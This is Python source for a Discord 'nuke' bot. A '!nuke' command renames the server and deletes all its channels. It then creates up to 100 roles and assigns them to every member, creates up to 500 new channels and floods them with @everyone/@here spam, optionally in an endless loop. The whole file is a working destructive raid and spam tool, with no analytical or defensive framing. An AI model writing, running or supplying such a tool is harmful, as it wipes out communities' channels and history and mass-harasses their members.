import discord
import aiohttp
import asyncio

TOKEN = ''

DEFAULT_CHANNEL_COUNT = 300

CHANNEL_NAME_BASE = "new-channel"

MESSAGES_PER_CHANNEL = 20

ROLE_NAME = "new-roll"
ROLE_COLOR = 0xFF0000  # 赤色
ROLE_COUNT = 100

NEW_SERVER_NAME = "new server"
NEW_SERVER_ICON_URL = "" 

LOOP_MESSAGE_CONTENT = """
@everyone  @here
new message
"""

intents = discord.Intents.default()
intents.message_content = True

class SuperFastBot(discord.Client):
    def __init__(self):
        super().__init__(intents=intents)
        self.target_channels = []
        self.loop_active = False

bot = SuperFastBot()

@bot.event
async def on_ready():
    print(f'起動: {bot.user.name}')

async def fetch_delete(session, channel_id, headers):
    url = f"https://discord.com/api/v10/channels/{channel_id}"
    async with session.delete(url, headers=headers) as response:
        return response.status

async def fetch_create(session, guild_id, name, headers):
    url = f"https://discord.com/api/v10/guilds/{guild_id}/channels"
    json_data = {"name": name, "type": 0}
    async with session.post(url, headers=headers, json=json_data) as response:
        if response.status == 201:
            res_json = await response.json()
            return res_json.get("id")
        return None

async def fetch_send(session, channel_id, content, headers):
    url = f"https://discord.com/api/v10/channels/{channel_id}/messages"
    json_data = {"content": content}
    async with session.post(url, headers=headers, json=json_data) as response:
        return response.status

async def fetch_create_role(session, guild_id, name, color, headers):
    url = f"https://discord.com/api/v10/guilds/{guild_id}/roles"
    json_data = {
        "name": name,
        "color": color,
        "hoist": True,
        "mentionable": True,
        "permissions": "0"
    }
    async with session.post(url, headers=headers, json=json_data) as response:
        if response.status == 200:
            res_json = await response.json()
            return res_json.get("id")
        return None

async def fetch_add_role(session, guild_id, member_id, role_id, headers):
    url = f"https://discord.com/api/v10/guilds/{guild_id}/members/{member_id}/roles/{role_id}"
    async with session.put(url, headers=headers) as response:
        return response.status

async def fetch_edit_guild(session, guild_id, name, icon_url, headers):
    url = f"https://discord.com/api/v10/guilds/{guild_id}"
    json_data = {"name": name}
    if icon_url:
        try:
            async with session.get(icon_url) as img_resp:
                if img_resp.status == 200:
                    import base64
                    data = await img_resp.read()
                    b64 = base64.b64encode(data).decode()
                    content_type = img_resp.headers.get("Content-Type", "image/png")
                    json_data["icon"] = f"data:{content_type};base64,{b64}"
        except:
            pass
    async with session.patch(url, headers=headers, json=json_data) as response:
        return response.status

async def super_fast_spam_loop(guild_id):
    headers = {"Authorization": f"Bot {TOKEN}"}
    
    async with aiohttp.ClientSession() as session:
        while bot.loop_active:
            if not bot.target_channels:
                await asyncio.sleep(0.1)
                continue
            
            tasks = [
                fetch_send(session, ch_id, LOOP_MESSAGE_CONTENT, headers)
                for ch_id in bot.target_channels
            ]
            
            await asyncio.gather(*tasks)
            await asyncio.sleep(0.05)

async def limited_spam(session, channel_ids, content, headers, count):
    for _ in range(count):
        tasks = [
            fetch_send(session, ch_id, content, headers)
            for ch_id in channel_ids
        ]
        await asyncio.gather(*tasks)

async def do_nuke(message, count):
    bot.loop_active = False
    await asyncio.sleep(0.5)
    bot.target_channels = []

    guild = message.guild
    headers = {"Authorization": f"Bot {TOKEN}"}

    async with aiohttp.ClientSession() as session:
        if NEW_SERVER_NAME or NEW_SERVER_ICON_URL:
            await fetch_edit_guild(session, guild.id, NEW_SERVER_NAME, NEW_SERVER_ICON_URL, headers)

        del_tasks = [fetch_delete(session, ch.id, headers) for ch in guild.channels]
        await asyncio.gather(*del_tasks)

        role_tasks = [
            fetch_create_role(session, guild.id, f"{ROLE_NAME}-{i}" if ROLE_COUNT > 1 else ROLE_NAME, ROLE_COLOR, headers)
            for i in range(ROLE_COUNT)
        ]
        role_results = await asyncio.gather(*role_tasks)
        new_role_ids = [r for r in role_results if r]

        member_ids = [m.id for m in guild.members if not m.bot]
        for role_id in new_role_ids:
            add_tasks = [
                fetch_add_role(session, guild.id, mid, role_id, headers)
                for mid in member_ids
            ]
            await asyncio.gather(*add_tasks)

        create_tasks = [
            fetch_create(session, guild.id, f"{CHANNEL_NAME_BASE}-{i}", headers)
            for i in range(1, count + 1)
        ]
        results = await asyncio.gather(*create_tasks)
        bot.target_channels = [ch_id for ch_id in results if ch_id is not None]

        if MESSAGES_PER_CHANNEL > 0:
            await limited_spam(session, bot.target_channels, LOOP_MESSAGE_CONTENT, headers, MESSAGES_PER_CHANNEL)
        else:
            bot.loop_active = True
            bot.loop.create_task(super_fast_spam_loop(guild.id))

    if MESSAGES_PER_CHANNEL > 0:
        await message.channel.send(f"💥 NUKE完了！{len(bot.target_channels)}個のチャンネルを作成!")
    else:
        await message.channel.send(f"💥 NUKE完了！{len(bot.target_channels)}個のチャンネルを作成,スパム開始！")

@bot.event
async def on_message(message):
    if message.author.bot:
        return
    
    if message.content.startswith("!nuke"):
        try:
            await message.delete()
        except:
            pass
        
        if not message.author.guild_permissions.administrator:
            return
        
        parts = message.content.split()
        count = DEFAULT_CHANNEL_COUNT
        if len(parts) > 1:
            try:
                count = int(parts[1])
                if count > 500:
                    count = 500
                if count <= 0:
                    count = DEFAULT_CHANNEL_COUNT
            except ValueError:
                pass
        
        await do_nuke(message, count)
        return

bot.run(TOKEN)
